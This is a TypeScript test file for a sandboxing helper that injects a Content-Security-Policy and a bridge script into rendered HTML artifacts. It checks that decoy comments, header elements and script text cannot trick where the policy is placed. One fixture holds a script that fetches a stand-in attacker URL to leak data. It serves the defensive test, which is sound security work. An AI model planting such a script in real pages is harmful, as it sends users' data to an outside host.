import { buildSandboxedDoc } from './WebpageRenderer';

function parse(srcDoc: string): Document {
    return new DOMParser().parseFromString(srcDoc, 'text/html');
}

function getCspMeta(doc: Document): HTMLMetaElement | null {
    return doc.head.querySelector('meta[http-equiv="Content-Security-Policy" i]');
}

describe('buildSandboxedDoc', () => {
    it('injects the CSP into the real <head>, not a decoy comment that merely looks like one', () => {
        const html = `
<html>
<!-- <head> -->
<head></head>
<body>
<script>fetch('https://attacker.example/leak')</script>
</body>
</html>`;

        const doc = parse(buildSandboxedDoc(html));

        const cspMeta = getCspMeta(doc);
        expect(cspMeta).not.toBeNull();
        expect(cspMeta!.getAttribute('content')).toContain("connect-src 'none'");

        // The decoy comment's literal text must be untouched — the fix should never treat it as markup.
        expect(doc.documentElement.outerHTML).toContain('<!-- <head> -->');
    });

    it('still injects the CSP into a real (implied) head when the input has no <head> tag at all', () => {
        const html = '<body><p>hi</p></body>';

        const doc = parse(buildSandboxedDoc(html));

        expect(getCspMeta(doc)).not.toBeNull();
        expect(doc.querySelector('script')).not.toBeNull();
    });

    it('does not mistake a <header> element for <head>', () => {
        const html = '<html><header>site header</header><head></head><body>content</body></html>';

        const doc = parse(buildSandboxedDoc(html));

        expect(getCspMeta(doc)).not.toBeNull();
        expect(doc.querySelector('header')?.textContent).toBe('site header');
    });

    it('keeps the CSP meta as the first child of <head> even when the artifact head has its own content', () => {
        const html = '<html><head><link rel="stylesheet" href="theme.css"></head><body>hi</body></html>';

        const doc = parse(buildSandboxedDoc(html));

        expect(doc.head.firstElementChild?.getAttribute('http-equiv')?.toLowerCase()).toBe('content-security-policy');
    });

    it('does not mistake head-like text inside a <script>/<style> block for a real head tag', () => {
        const html = `
<html>
<script>var s = "<head>oops</head>";</script>
<head></head>
<body>content</body>
</html>`;

        const doc = parse(buildSandboxedDoc(html));

        expect(getCspMeta(doc)).not.toBeNull();
        const decoyScript = Array.from(doc.querySelectorAll('script')).find((el) => el.textContent?.includes('oops'));
        expect(decoyScript?.textContent).toBe('var s = "<head>oops</head>";');
    });

    it('preserves the artifact content end-to-end aside from the two injected elements', () => {
        const html = `<html><head><style>body { color: red; }</style></head><body><h1>Hello</h1><script>console.log('hi')</script></body></html>`;

        const doc = parse(buildSandboxedDoc(html));

        expect(doc.querySelector('style')?.textContent).toBe('body { color: red; }');
        expect(doc.querySelector('h1')?.textContent).toBe('Hello');
        expect(Array.from(doc.querySelectorAll('script')).some((el) => el.textContent?.includes('console.log'))).toBe(
            true
        );
    });

    it('preserves the doctype', () => {
        const html = '<!DOCTYPE html><html><head></head><body>hi</body></html>';

        const srcDoc = buildSandboxedDoc(html);

        expect(srcDoc.toLowerCase().startsWith('<!doctype html>')).toBe(true);
    });

    it('places the injected bridge script in <head>, ahead of body content', () => {
        const html = '<html><head></head><body><script>console.log("artifact script")</script></body></html>';

        const doc = parse(buildSandboxedDoc(html));

        const headScripts = Array.from(doc.head.querySelectorAll('script'));
        expect(headScripts.some((el) => el.textContent?.includes('lumo-resize'))).toBe(true);
    });
});
